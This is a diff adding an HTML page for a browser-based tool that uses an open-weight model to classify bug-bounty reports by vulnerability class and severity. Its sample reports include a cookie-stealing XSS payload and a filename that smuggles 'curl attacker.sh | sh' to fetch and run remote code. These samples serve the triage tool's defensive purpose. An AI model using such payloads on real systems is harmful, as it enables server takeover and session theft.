@@ -1,0 +1,153 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bounty Triage AI</title>
+<style>
+  :root { --bg:#0f1115; --card:#181b22; --fg:#e8eaf0; --muted:#9aa3b2; --accent:#7c5cff; --line:#2a2f3a;
+          --crit:#ff4d6d; --high:#ff8c42; --med:#ffd166; --low:#06d6a0; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg); font:15px/1.5 system-ui,-apple-system,Segoe UI,sans-serif; }
+  main { max-width:820px; margin:0 auto; padding:32px 16px 64px; }
+  h1 { margin:0 0 4px; font-size:28px; }
+  p.sub { margin:0 0 24px; color:var(--muted); }
+  textarea { width:100%; min-height:180px; background:var(--card); color:var(--fg); border:1px solid var(--line);
+             border-radius:10px; padding:12px; font:inherit; resize:vertical; }
+  .row { display:flex; gap:8px; flex-wrap:wrap; margin:12px 0 24px; }
+  button { background:var(--accent); color:#fff; border:0; border-radius:8px; padding:10px 16px; font:inherit; cursor:pointer; }
+  button.ghost { background:transparent; border:1px solid var(--line); color:var(--fg); }
+  button:disabled { opacity:.5; cursor:wait; }
+  #status { color:var(--muted); font-size:13px; align-self:center; }
+  .grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+  @media (max-width:640px) { .grid { grid-template-columns:1fr; } }
+  .card { background:var(--card); border:1px solid var(--line); border-radius:10px; padding:16px; }
+  .card h2 { margin:0 0 12px; font-size:14px; text-transform:uppercase; letter-spacing:.06em; color:var(--muted); }
+  .bar { display:flex; align-items:center; gap:8px; margin:6px 0; font-size:14px; }
+  .bar span.l { width:150px; flex:none; }
+  .bar .t { flex:1; height:8px; background:var(--line); border-radius:4px; overflow:hidden; }
+  .bar .f { height:100%; background:var(--accent); }
+  .bar span.v { width:44px; text-align:right; color:var(--muted); font-variant-numeric:tabular-nums; }
+  .badge { display:inline-block; padding:2px 10px; border-radius:999px; font-weight:600; color:#111; }
+  pre { white-space:pre-wrap; background:var(--card); border:1px solid var(--line); border-radius:10px; padding:16px; margin-top:16px; }
+  footer { margin-top:32px; color:var(--muted); font-size:13px; }
+  a { color:var(--accent); }
+</style>
+</head>
+<body>
+<main>
+  <h1>🎃 Bounty Triage AI</h1>
+  <p class="sub">Paste a bug bounty / vulnerability report. An open-weight NLI model runs <b>100% in your browser</b>
+    (no server, no API keys, report never leaves your machine) and suggests vulnerability class, severity and a triage note.</p>
+
+  <textarea id="report" placeholder="e.g. The /api/v1/users/{id}/invoices endpoint returns invoices for any user id. By changing the id parameter while logged in as a normal user I could download other customers' invoices including names and addresses."></textarea>
+  <div class="row">
+    <button id="go">Triage report</button>
+    <button class="ghost" id="ex1">Example: IDOR</button>
+    <button class="ghost" id="ex2">Example: XSS</button>
+    <button class="ghost" id="ex3">Example: RCE</button>
+    <span id="status">Model loads on first run (~25 MB, cached afterwards).</span>
+  </div>
+
+  <div class="grid" id="results" hidden>
+    <div class="card"><h2>Vulnerability class</h2><div id="types"></div></div>
+    <div class="card"><h2>Severity</h2><div id="sev"></div></div>
+  </div>
+  <pre id="note" hidden></pre>
+
+  <footer>
+    Model: <a href="https://huggingface.co/Xenova/mobilebert-uncased-mnli" target="_blank" rel="noopener">Xenova/mobilebert-uncased-mnli</a>
+    (Apache-2.0) via <a href="https://github.com/huggingface/transformers.js" target="_blank" rel="noopener">Transformers.js</a>.
+    Built for Hacktoberfest Hack Day Khulna 2026. Suggestions only — a human triager decides.
+  </footer>
+</main>
+
+<script type="module">
+import { pipeline } from "https://cdn.jsdelivr.net/npm/@huggingface/transformers@3.0.2";
+
+const TYPES = {
+  "Cross-Site Scripting (XSS)": "injecting javascript or html that runs in another user's browser",
+  "SQL Injection": "injecting sql into a database query",
+  "IDOR / Broken Access Control": "accessing or modifying another user's data by changing an id",
+  "SSRF": "making the server send requests to internal or arbitrary urls",
+  "Remote Code Execution": "executing arbitrary commands or code on the server",
+  "Authentication Bypass": "logging in or bypassing authentication, password reset or session",
+  "CSRF": "forcing a logged in user to perform an unwanted action from another site",
+  "Information Disclosure": "leaking secrets, keys, stack traces or sensitive configuration",
+};
+const SEVS = {
+  Critical: "full system compromise or mass data breach",
+  High: "access to other users' sensitive data or accounts",
+  Medium: "limited impact that requires user interaction",
+  Low: "minor issue with little security impact",
+};
+const SEV_COLOR = { Critical:"var(--crit)", High:"var(--high)", Medium:"var(--med)", Low:"var(--low)" };
+const EXAMPLES = {
+  ex1: "The /api/v1/users/{id}/invoices endpoint returns invoices for any user id. By changing the id parameter while logged in as a normal user I could download other customers' invoices including names and addresses.",
+  ex2: "The search box on /products reflects the q parameter without encoding. Visiting /products?q=<script>alert(document.cookie)</script> executes the script in the victim's browser, allowing session theft.",
+  ex3: "The image resize endpoint passes the filename to ImageMagick via a shell. Uploading a file named `a.png; curl attacker.sh | sh` executes my commands on the server as www-data.",
+};
+
+const $ = (id) => document.getElementById(id);
+let classifier;
+
+async function load() {
+  if (classifier) return classifier;
+  $("status").textContent = "Downloading open-weight model…";
+  classifier = await pipeline("zero-shot-classification", "Xenova/mobilebert-uncased-mnli", {
+    progress_callback: (p) => { if (p.status === "progress") $("status").textContent = `Downloading ${p.file}: ${Math.round(p.progress)}%`; },
+  });
+  return classifier;
+}
+
+async function rank(text, map) {
+  const labels = Object.values(map);
+  const out = await classifier(text, labels, { multi_label: false, hypothesis_template: "This report describes {}." });
+  const names = Object.keys(map);
+  return out.labels.map((l, i) => ({ name: names[labels.indexOf(l)], score: out.scores[i] }));
+}
+
+function bars(el, rows, color) {
+  el.innerHTML = rows.slice(0, 5).map((r) => `
+    <div class="bar"><span class="l">${r.name}</span>
+      <div class="t"><div class="f" style="width:${(r.score * 100).toFixed(1)}%;${color ? `background:${color(r.name)}` : ""}"></div></div>
+      <span class="v">${(r.score * 100).toFixed(0)}%</span></div>`).join("");
+}
+
+async function triage() {
+  const text = $("report").value.trim();
+  if (!text) { $("status").textContent = "Paste a report first."; return; }
+  $("go").disabled = true;
+  try {
+    await load();
+    $("status").textContent = "Analyzing…";
+    const types = await rank(text, TYPES);
+    const sevs = await rank(text, SEVS);
+    bars($("types"), types);
+    bars($("sev"), sevs, (n) => SEV_COLOR[n]);
+    $("results").hidden = false;
+    const top = types[0], sev = sevs[0];
+    $("note").hidden = false;
+    $("note").textContent =
+`## Triage note (AI-suggested)
+- Suggested class: ${top.name} (${(top.score * 100).toFixed(0)}% confidence)
+- Suggested severity: ${sev.name} (${(sev.score * 100).toFixed(0)}% confidence)
+- Runner-up class: ${types[1].name}
+
+Next steps:
+1. Reproduce the issue in a test environment.
+2. Confirm impact and adjust severity (CVSS) if needed.
+3. Assign to the owning team and notify the researcher.`;
+    $("status").textContent = "Done. Runs fully offline after first load.";
+  } catch (e) {
+    $("status").textContent = "Error: " + e.message;
+  } finally {
+    $("go").disabled = false;
+  }
+}
+
+$("go").onclick = triage;
+for (const id of Object.keys(EXAMPLES)) $(id).onclick = () => { $("report").value = EXAMPLES[id]; triage(); };
+</script>
+</body>
+</html>
